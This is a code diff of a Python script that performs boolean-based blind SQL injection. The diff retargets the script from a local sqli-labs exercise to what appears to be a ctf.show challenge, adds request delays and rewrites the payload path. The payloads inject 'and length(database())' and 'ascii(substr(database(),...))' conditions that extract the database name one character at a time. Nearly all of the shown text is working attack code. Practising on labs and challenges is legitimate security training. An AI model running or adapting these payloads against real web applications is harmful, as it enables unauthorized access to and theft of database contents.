@@ -5,14 +5,16 @@ import time
 
 import requests
 
-url = "http://localhost/sqli-labs-master/Less-8/"
+url = "http://d7345d2e-d1e7-4ced-a97c-83249213e10d.challenge.ctf.show/select-no-waf-4.php/"
 
 
 # dbNameLen=-1
 def getDbNameLen(url):
     dbNameLen = -1
+
     for i in range(1, 15):
-        payload = "?id=1'+and+length(database())=" + str(i) + "--+"
+        time.sleep(0.5)
+        payload = "api/v4.php?id=1'+and+length(database())=" + str(i) + "--+"
         fullUrl = url + payload
         # print(fullUrl)
         time.sleep(0.1)
@@ -31,7 +33,8 @@ def getDbName(ur1, dbNameLen):
     dbName = ""
     for i in range(1, dbNameLen + 1):
         for j in range(1, 128):
-            payload = "?id=1'+and+ascii(substr(database()," + str(i) + ",1))=" + str(j) + "--+"
+            time.sleep(0.5)
+            payload = "api/v4.php?id=1'+and+ascii(substr(database()," + str(i) + ",1))=" + str(j) + "--+"
 
             fullUrl = url + payload
             # print ( ful1Ur1)
